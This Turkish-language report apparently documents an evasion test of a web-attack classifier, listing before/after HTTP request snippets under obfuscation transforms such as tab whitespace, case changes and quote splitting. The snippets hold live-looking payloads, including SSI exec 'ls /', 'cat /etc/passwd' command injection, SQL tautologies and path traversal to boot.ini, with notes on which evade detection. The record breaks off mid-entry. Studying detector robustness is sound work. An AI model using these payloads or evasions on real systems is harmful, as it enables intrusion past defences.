# Gizleme örnekleri — ds_base_family_0.8_s42

Her dönüşüm ve sınıf için en fazla 2 örnek (yalnızca değişen kısım çevresi).

## case

Varsayım: SQLi: SQL anahtar kelimeleri; XSS: HTML etiket/öznitelik adları büyük/küçük harfe duyarsızdır.

- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: `GET /%2522%253E%253C%2521--%2523EXEC%2Bcmd%253D%2522ls%2B%252F%2522--%253E%253C/index.`
  - sonra: `GET /%2522%253E%253C%2521--%2523Exec%2Bcmd%253D%2522ls%2B%252F%2522--%253E%253C/index.`
- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: `POST /%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/wp-comments-post.php`
  - sonra: `POST /%22%3E%3C%21--%23ExEC+cmd%3D%22ls+%2F%22--%3E%3C/wp-comments-post.php`

## whitespace

Varsayım: Payload benzeri parçalarda boşluk yerine sekme: SQL, HTML öznitelik ayırıcısı, POSIX kabuk (IFS), HTTP header OWS için eşdeğer.

- **Code Injection** (tahmin: Code Injection → Code Injection)
  - önce: `assword_current=tNCEQiU&password_1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&password_2=tNCEQiU&_wpnonce=b9dad6a8b5`
  - sonra: `assword_current=tNCEQiU&password_1=%3C%21--%23EXEC%09cmd%3D%22ls%09%2F%22--%3E&password_2=tNCEQiU&_wpnonce=b9dad6a8b5`
- **Code Injection** (tahmin: Code Injection → Code Injection)
  - önce: `=dVSzG&password_1=dVSzG&password_2=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&_wpnonce=b9dad6a8b5&_wp_http_referer=%`
  - sonra: `=dVSzG&password_1=dVSzG&password_2=%3C%21--%23EXEC%09cmd%3D%22ls%09%2F%22--%3E&_wpnonce=b9dad6a8b5&_wp_http_referer=%`
- **Dictionary-based Password Attack** (tahmin: Dictionary-based Password Attack → SQL Injection)
  - önce: `lHeron9&pwd=1Ik$o&rememberme=forever&wp-submit=Log+In+AND+1%3D2+--+&redirect_to=http%3A%2F%2Ftest-site.com%2Fblog%2Fw`
  - sonra: `lHeron9&pwd=1Ik$o&rememberme=forever&wp-submit=Log%09In%09AND%091%3D2%09--%09&redirect_to=http%3A%2F%2Ftest-site.com%2Fblog%2Fw`
- **Dictionary-based Password Attack** (tahmin: Dictionary-based Password Attack → Dictionary-based Password Attack)
  - önce: `ron4&pwd=0!jB*B#$&rememberme=forever&wp-submit=Log+In+OR+1%3D1&redirect_to=http%3A%2F%2Ftest-site.com%2Fblo`
  - sonra: `ron4&pwd=0!jB*B#$&rememberme=forever&wp-submit=Log%09In%09OR%091%3D1&redirect_to=http%3A%2F%2Ftest-site.com%2Fblo`
- **Fake the Source of Data** (tahmin: Fake the Source of Data → Fake the Source of Data)
  - önce: `hp/?action=HTTP%3A%2F%2Fwww.google.com&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=gutturalIguana9&password=qa_vDcM8&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-acc`
  - sonra: `hp/?action=HTTP%3A%2F%2Fwww.google.com&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=gutturalIguana9&password=qa_vDcM8&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy`
- **Fake the Source of Data** (tahmin: Fake the Source of Data → Fake the Source of Data)
  - önce: `unt/edit-profile/post.php?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
  - sonra: `unt/edit-profile/post.php?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
- **HTTP Response Splitting** (tahmin: HTTP Response Splitting → HTTP Response Splitting)
  - önce: `GET /blog%0Asleep+15%0A/index.php HTTP/1.1 Host: test-site.com User-`
  - sonra: `GET /blog%0Asleep%0915%0A/index.php HTTP/1.1 Host: test-site.com User-`
- **HTTP Response Splitting** (tahmin: HTTP Response Splitting → HTTP Response Splitting)
  - önce: `GET /blog%0Asleep+15%0A/index.php/2020/04 HTTP/1.1 Host: test-site.c`
  - sonra: `GET /blog%0Asleep%0915%0A/index.php/2020/04 HTTP/1.1 Host: test-site.c`
- **HTTP Verb Tampering** (tahmin: HTTP Verb Tampering → HTTP Verb Tampering)
  - önce: `CK /blog/index.php/my-account/edit-profile/%7B%7B%20attachment.thumbnail.url%20%7D%7DP3A6W HTTP/1.1 Host: test-site.com User-Agen`
  - sonra: `CK /blog/index.php/my-account/edit-profile/%7B%7B%09attachment.thumbnail.url%09%7D%7DP3A6W HTTP/1.1 Host: test-site.com User-Agen`
- **HTTP Verb Tampering** (tahmin: HTTP Verb Tampering → HTTP Verb Tampering)
  - önce: `CK /blog/index.php/my-account/edit-profile/%7B%7B%20attachment.url%20%7D%7DHFTOF HTTP/1.1 Host: test-site.com User-Agen`
  - sonra: `CK /blog/index.php/my-account/edit-profile/%7B%7B%09attachment.url%09%7D%7DHFTOF HTTP/1.1 Host: test-site.com User-Agen`
- **Input Data Manipulation** (tahmin: Input Data Manipulation → Input Data Manipulation)
  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: etc/passwd  username=truthfulWigeon4&password=F3nGVaF&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: etc/passwd  username=truthfulWigeon4&password=F3nGVaF&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2`
- **Input Data Manipulation** (tahmin: Input Data Manipulation → Input Data Manipulation)
  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: http://www.google.com/search?q=OWASP%20freedom  username=pleasedSalami8&password=1r65p&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: http://www.google.com/search?q=OWASP%20freedom  username=pleasedSalami8&password=1r65p&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `-profile/post.php/?action=etc%2Fpasswd&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=awedChamois0&password=Ufr0Ts&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%`
  - sonra: `-profile/post.php/?action=etc%2Fpasswd&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=awedChamois0&password=Ufr0Ts&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-acco`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `post.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=foreve`
  - sonra: `post.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2509data.id%2509%257D%257D&login=Login&redirect=&rememberme=foreve`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=jealousThrushe5&password=-O69Fn&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-accou`
  - sonra: `%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=jealousThrushe5&password=-O69Fn&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-a`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=tautCrackers0&password=n0L&7*!&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-accoun`
  - sonra: `%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=tautCrackers0&password=n0L&7*!&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-ac`
- **Protocol Manipulation** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `ount/edit-profile/post.php/?action=%00&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
  - sonra: `ount/edit-profile/post.php/?action=%00&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
- **Protocol Manipulation** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `ount/edit-profile/post.php/?action=%00&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=customer;`
  - sonra: `ount/edit-profile/post.php/?action=%00&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: comment_author_url_1aefbe2f76edd740f8e362f39da3353b=http%3A%2F%2Fwww.example.com; comment_author_email_1aefbe2f76edd740f8e362f39da3353b=foo-bar%40example.com; comment_author_1aefbe2f76edd740f8e362f39da3353b=custo`
- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: `log/etc%252Fpasswd/my-account/edit-profile/%7B%7B%20data.editLink%20%7D%7D&image-editor HTTP/1.1 Host: test-site.com U`
  - sonra: `log/etc%252Fpasswd/my-account/edit-profile/%7B%7B%09data.editLink%09%7D%7D&image-editor HTTP/1.1 Host: test-site.com U`
- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: `252Fetc%252Fpasswd/my-account/edit-profile/%7B%7B%20data.link%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
  - sonra: `252Fetc%252Fpasswd/my-account/edit-profile/%7B%7B%09data.link%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`

## sql_comment

Varsayım: SQL anahtar kelimelerine bitişik boşluk yerine /**/ (MySQL, PostgreSQL, MSSQL'de eşdeğer).

- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: `GET /%2522%253E%253C%2521--%2523EXEC%2Bcmd%253D%2522ls%2B%252F%2522--%253E%253C/index.php`
  - sonra: `GET /%2522%253E%253C%2521--%2523EXEC%252F%252A%252A%252Fcmd%253D%2522ls%2B%252F%2522--%253E%253C/index.php`
- **SQL Injection** (tahmin: SQL Injection → SQL Injection)
  - önce: `POST /%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/wp-comments-post.php HT`
  - sonra: `POST /%22%3E%3C%21--%23EXEC%2F%2A%2A%2Fcmd%3D%22ls+%2F%22--%3E%3C/wp-comments-post.php HT`

## cmd_quote

Varsayım: Kabuk komut adına boş tırnak çifti ("") eklemek (bash/sh ve cmd.exe komut adını değiştirmez).

- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `-form-urlencoded  password_current=IE6e$R7W%7C%7Csleep+15&password_1=IE6e$R7W&password_2=IE6e$R7W&_w`
  - sonra: `-form-urlencoded  password_current=IE6e$R7W%7C%7Cs%22%22leep+15&password_1=IE6e$R7W&password_2=IE6e$R7W&_w`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `password_current=4flUBDn&password_1=4flUBDn%27%3Bcat+%2Fetc%2Fpasswd%3B%27&password_2=4flUBDn&_wpnon`
  - sonra: `password_current=4flUBDn&password_1=4flUBDn%27%3Bc%22%22at+%2Fetc%2Fpasswd%3B%27&password_2=4flUBDn&_wpnon`

## path_dot

Varsayım: '../' yerine './../' (yol çözümlemesinde eşdeğer).

- **Path Traversal** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `GET /cwhp/auditLog.do?file=..\..\..\..\..\..\..\boot.ini HTTP/1.1 Host: 249.network5-175-62-1`
  - sonra: `GET /cwhp/auditLog.do?file=.\..\.\..\.\..\.\..\.\..\.\..\.\..\boot.ini HTTP/1.1 Host: 249.network5-175-62-1`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `GET /cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\lib\classpath\com\cisc`
  - sonra: `GET /cwhp/auditLog.do?file=.\..\.\..\.\..\.\..\.\..\.\..\.\..\Program%20Files\CSCOpx\lib\classpath\com\cisc`

## encoding_norm

Varsayım: ÇÖZÜCÜYE BAĞLI: çok katmanlı URL encoding tek katmana indirilir; hedef yinelemeli çözüyorsa eşdeğer.

- **Code Injection** (tahmin: Code Injection → Code Injection)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Code Injection** (tahmin: Code Injection → Code Injection)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22-`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22-`
- **Dictionary-based Password Attack** (tahmin: Dictionary-based Password Attack → Dictionary-based Password Attack)
  - önce: `http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&pwd=*rC0daP&rememberme=forever&wp-submit=Log+`
  - sonra: `http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%20ZAP&pwd=*rC0daP&rememberme=forever&wp-submit=Log+`
- **Dictionary-based Password Attack** (tahmin: Dictionary-based Password Attack → Dictionary-based Password Attack)
  - önce: `3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&testcookie=1`
  - sonra: `3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%20ZAP&testcookie=1`
- **Fake the Source of Data** (tahmin: Fake the Source of Data → Fake the Source of Data)
  - önce: `3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520area/index.php HTTP/1.1 Host: test-site.com User-`
  - sonra: `3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%20area/index.php HTTP/1.1 Host: test-site.com User-`
- **Fake the Source of Data** (tahmin: Fake the Source of Data → Fake the Source of Data)
  - önce: `http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520marriage/03 HTTP/1.1 Host: test-site.com User-Age`
  - sonra: `http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%20marriage/03 HTTP/1.1 Host: test-site.com User-Age`
- **HTTP Response Splitting** (tahmin: HTTP Response Splitting → HTTP Response Splitting)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **HTTP Response Splitting** (tahmin: HTTP Response Splitting → HTTP Response Splitting)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **HTTP Verb Tampering** (tahmin: HTTP Verb Tampering → HTTP Verb Tampering)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Input Data Manipulation** (tahmin: Input Data Manipulation → Input Data Manipulation)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Input Data Manipulation** (tahmin: Input Data Manipulation → Input Data Manipulation)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Path Traversal** (tahmin: Path Traversal → Path Traversal)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Protocol Manipulation** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **Protocol Manipulation** (tahmin: Protocol Manipulation → Protocol Manipulation)
  - önce: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever`
  - sonra: `t-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%7B%7B%20data.id%20%7D%7D&login=Login&redirect=&rememberme=forever`
- **SQL Injection** (tahmin: SQL Injection → Normal)
  - önce: `GET /blog/etc%252Fpasswd/my-account/edit-profile/%7B%7B%20data.edit`
  - sonra: `GET /blog/etc%2Fpasswd/my-account/edit-profile/%7B%7B%20data.edit`
- **SQL Injection** (tahmin: SQL Injection → Normal)
  - önce: `GET /blog/%252Fetc%252Fpasswd/my-account/edit-profile/%7B%7B%20data.lin`
  - sonra: `GET /blog/%2Fetc%2Fpasswd/my-account/edit-profile/%7B%7B%20data.lin`

## combo

Varsayım: Kategoriye uygulanabilen tüm dönüşümler birlikte: artifact, sql_comment, html_slash, cmd_quote, path_dot, case, whitespace (çözücüye bağlı encoding_norm hariç).

- **Code Injection** (tahmin: Code Injection → Code Injection)
  - önce: `assword_current=tNCEQiU&password_1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&password_2=tNCEQiU&_wpnonce=b9dad6a8b5`
  - sonra: `assword_current=tNCEQiU&password_1=%3C%21--%23EXEC%09cmd%3D%22ls%09%2F%22--%3E&password_2=tNCEQiU&_wpnonce=b9dad6a8b5`
- **Code Injection** (tahmin: Code Injection → Code Injection)
  - önce: `=dVSzG&password_1=dVSzG&password_2=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&_wpnonce=b9dad6a8b5&_wp_http_referer=%`
  - sonra: `=dVSzG&password_1=dVSzG&password_2=%3C%21--%23EXEC%09cmd%3D%22ls%09%2F%22--%3E&_wpnonce=b9dad6a8b5&_wp_http_referer=%`
- **Dictionary-based Password Attack** (tahmin: Dictionary-based Password Attack → SQL Injection)
  - önce: `lHeron9&pwd=1Ik$o&rememberme=forever&wp-submit=Log+In+AND+1%3D2+--+&redirect_to=http%3A%2F%2Ftest-site.com%2Fblog%2Fw`
  - sonra: `lHeron9&pwd=1Ik$o&rememberme=forever&wp-submit=Log%09In%09AND%091%3D2%09--%09&redirect_to=http%3A%2F%2Ftest-site.com%2Fblog%2Fw`
- **Dictionary-based Password Attack** (tahmin: Dictionary-based Password Attack → Dictionary-based Password Attack)
  - önce: `ron4&pwd=0!jB*B#$&rememberme=forever&wp-submit=Log+In+OR+1%3D1&redirect_to=http%3A%2F%2Ftest-site.com%2Fblo`
  - sonra: `ron4&pwd=0!jB*B#$&rememberme=forever&wp-submit=Log%09In%09OR%091%3D1&redirect_to=http%3A%2F%2Ftest-site.com%2Fblo`
- **Fake the Source of Data** (tahmin: Fake the Source of Data → Fake the Source of Data)
  - önce: `hp/?action=HTTP%3A%2F%2Fwww.google.com&post=%7B%7B+data.id+%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=gutturalIguana9&password=qa_vDcM8&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-acc`
  - sonra: `hp/?action=HTTP%3A%2F%2Fwww.google.com&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: application/x-www-form-urlencoded  username=gutturalIguana9&password=qa_vDcM8&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy`
- **Fake the Source of Data** (tahmin: Fake the Source of Data → Fake the Source of Data)
  - önce: `unt/edit-profile/post.php?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
  - sonra: `unt/edit-profile/post.php?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mo`
- **HTTP Response Splitting** (tahmin: HTTP Response Splitting → HTTP Response Splitting)
  - önce: `GET /blog%0Asleep+15%0A/index.php HTTP/1.1 Host: test-site.com User-`
  - sonra: `GET /blog%0Asleep%0915%0A/index.php HTTP/1.1 Host: test-site.com User-`
- **HTTP Response Splitting** (tahmin: HTTP Response Splitting → HTTP Response Splitting)
  - önce: `GET /blog%0Asleep+15%0A/index.php/2020/04 HTTP/1.1 Host: test-site.c`
  - sonra: `GET /blog%0Asleep%0915%0A/index.php/2020/04 HTTP/1.1 Host: test-site.c`
- **HTTP Verb Tampering** (tahmin: HTTP Verb Tampering → HTTP Verb Tampering)
  - önce: `CK /blog/index.php/my-account/edit-profile/%7B%7B%20attachment.thumbnail.url%20%7D%7DP3A6W HTTP/1.1 Host: test-site.com User-Agen`
  - sonra: `CK /blog/index.php/my-account/edit-profile/%7B%7B%09attachment.thumbnail.url%09%7D%7DP3A6W HTTP/1.1 Host: test-site.com User-Agen`
- **HTTP Verb Tampering** (tahmin: HTTP Verb Tampering → HTTP Verb Tampering)
  - önce: `CK /blog/index.php/my-account/edit-profile/%7B%7B%20attachment.url%20%7D%7DHFTOF HTTP/1.1 Host: test-site.com User-Agen`
  - sonra: `CK /blog/index.php/my-account/edit-profile/%7B%7B%09attachment.url%09%7D%7DHFTOF HTTP/1.1 Host: test-site.com User-Agen`
- **Input Data Manipulation** (tahmin: Input Data Manipulation → Input Data Manipulation)
  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: etc/passwd  username=truthfulWigeon4&password=F3nGVaF&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: etc/passwd  username=truthfulWigeon4&password=F3nGVaF&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2`
- **Input Data Manipulation** (tahmin: Input Data Manipulation → Input Data Manipulation)
  - önce: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: http://www.google.com/search?q=OWASP%20freedom  username=pleasedSalami8&password=1r65p&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.`
  - sonra: `nt/edit-profile/post.php/?action=edit&post=%7B%7B%09data.id%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0 Cookie: wordpress_test_cookie=WP+Cookie+check Content-Type: http://www.google.com/search?q=OWASP%20freedom  username=pleasedSalami8&password=1r65p&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.`
- **OS Command Injection** (tahmin: OS Command Injection → OS Command Injection)
